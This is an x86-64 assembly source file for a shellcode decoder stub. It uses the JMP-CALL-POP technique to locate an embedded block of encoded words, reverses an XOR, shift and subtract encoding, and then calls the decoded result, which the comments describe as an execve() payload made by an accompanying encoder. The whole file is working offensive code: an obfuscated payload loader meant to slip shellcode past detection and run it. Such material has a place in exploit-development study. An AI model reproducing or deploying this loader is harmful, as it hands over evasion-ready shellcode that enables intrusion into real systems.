global _start

section .text

_start:
    ;
    ; [ROT-N + SHL-N + XOR-N] encoded execve() code block
    ;
    jmp short call_decoder       ; jump to call_decoder to save encoded_shellcode pointer to RSI
	
decoder:

    pop rsi                      ; store encoded_shellcode pointer in RSI
    push rsi   		         ; push encoded_shellcode pointer to stack for later execution
    mov rdi, rsi                 ; move encoded_shellcode pointer to RDI

decode:
    ;
    ; note: 1) Make sure ROT, SHR, and XOR here match your encoder.py input.
    ;       2) Hence we're limited by the size of encoded_shellcode (word),
    ;          SHR is limited to <1-8> bits. Feel free to upgrade size to DW 
    ;          to allow up to 16-bits shift if need be.
    ;
    mov ax, [rsi]                ; move current word from encoded_shellcode to AX
    xor ax, 0x539                ; XOR encoded_shellcode with 1337, one word at a time  
    jz decoded_shellcode         ; if zero jump to decoded_shellcode
    shr ax, 1                    ; shift encoded_shellcode to right by one bit, one word at a time	
    sub ax, 13                   ; substract 13 from encoded_shellcode, one word at a time
    mov [rdi], al                ; move decoded byte to RDI	
    inc rsi                      ; point to the next encoded_shellcode word
    inc rsi
    inc rdi                      ; point to the next decoded_shellcode byte
    jmp short decode             ; jump to decode and repeat the decoding process for the next word!

decoded_shellcode:
    call [rsp]                   ; execute decoded_shellcode

call_decoder:
    call decoder
    encoded_shellcode: dw 0x583, 0x475, 0x587, 0x5ef, 0x593, 0x4a9, 0x541, 0x5e7, 0x5d5, 0x5cf, 0x541, 0x541, 0x439, 0x5d3, 0x5f9, 0x5fb, 0x5e1, 0x443, 0x5a9, 0x501, 0x51d, 0x539 
